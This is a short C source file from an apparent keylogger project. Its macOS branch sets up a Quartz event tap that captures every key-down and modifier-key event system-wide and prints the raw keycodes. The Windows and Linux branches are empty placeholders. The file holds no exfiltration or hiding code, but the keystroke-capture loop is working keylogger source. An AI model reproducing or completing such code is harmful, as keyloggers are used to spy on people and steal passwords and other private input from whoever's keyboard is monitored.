#include "../include/keylogger.h"

void getKeyStrokes() {
#ifdef __APPLE__
    // Defines a mask that identifies the set of Quartz events to be observed in an event tap.
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));

    // Creates an event tap and returns a CFMachPortRef to a CFMachPort object.
    CFMachPortRef eventTap = CGEventTapCreate(
            kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, eventCallback, NULL
    );

    // If event tap is null, event tap could not be created.
    if (eventTap == NULL) {
        fprintf(stderr, "ERROR: Event Tap could not be created.\n");
        exit(1);
    }

    // Creates a CFRunLoopSource object for a CFMachPort object.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);

    // Adds a CFRunLoopSource object to a run loop mode.
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);

    // Enables or disables an event tap.
    CGEventTapEnable(eventTap, true);

    //Runs the current thread’s CFRunLoop object in its default mode indefinitely.
    CFRunLoopRun();
#endif

#ifdef _WIN32
    //Implement Windows key logger logic
#endif

#ifdef linux
    //Implement Linux key logger logic
#endif
}

// Called when event tap mask is satisfied.
// Type should be either kCGEventKeyDown OR kCGEventFlagsChanged.
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    // Get virtual key code from quartz event field
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    if (type == kCGEventKeyDown) {
        printf("%hu ", keyCode);
    } else {
        // TODO: Convert this from '56' (shift) for e.g. to 'Shift'
        printf("%hu ", keyCode);
    }

    return event;
}